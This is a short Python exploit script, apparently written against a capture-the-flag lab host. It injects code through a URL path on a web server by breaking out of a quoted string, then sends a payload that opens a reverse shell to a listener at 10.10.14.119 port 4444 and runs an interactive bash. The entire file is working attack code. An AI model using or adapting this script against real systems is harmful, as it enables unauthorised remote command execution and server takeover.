#!/usr/bin/env python3
import requests
import urllib
#import os

target = 'http://10.10.10.168:8080/'
#target = 'http://127.0.0.1:8081/'
lhost = '10.10.14.119'
lport = 4444
payload='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'.format(lhost,lport)

path='jumk\';{}#junk'.format(payload)


payload = urllib.parse.quote(path)
print("payload")
print(target+payload)

r= requests.get(target+payload)
print(r.headers)
print(r.text)
